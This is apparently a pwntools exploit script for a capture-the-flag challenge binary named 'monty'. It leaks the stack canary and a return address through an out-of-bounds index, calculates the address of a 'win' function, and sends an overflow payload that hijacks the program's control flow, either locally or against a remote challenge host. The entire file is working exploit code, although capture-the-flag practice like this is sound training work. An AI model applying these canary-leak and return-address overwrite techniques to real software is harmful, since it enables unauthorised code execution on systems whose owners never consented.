from pwn import *

exe = ELF('./monty')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *game+826
        continue
    """)
elif args.REMOTE:
    io = remote("chall.lac.tf", 31132)

rop = ROP(exe)
offset = 40

cards_addr = 0x1d0
name_addr = 0x20
canary_addr = 0x8

diff = cards_addr - canary_addr
assert diff % 8 == 0 and diff // 8 < 0x52
print(diff // 8)

io.sendlineafter(b'?', str((diff // 8) - 2).encode())
io.recvuntil(b':')
canary = int(io.recvline())
print(f'{hex(canary) = }')

io.sendlineafter(b'?', str(diff // 8).encode())
io.recvuntil(b':')
return_addr = int(io.recvline())
print(f'{hex(return_addr) = }')

win_addr = return_addr - (exe.symbols['main'] + 48) + exe.symbols['win']
print(f'{hex(win_addr) = }')

payload = b''
payload += pack(canary) * 4
payload += pack(win_addr) * 10

io.sendlineafter(b'!', b'0')
io.sendlineafter(b':', payload)

io.interactive()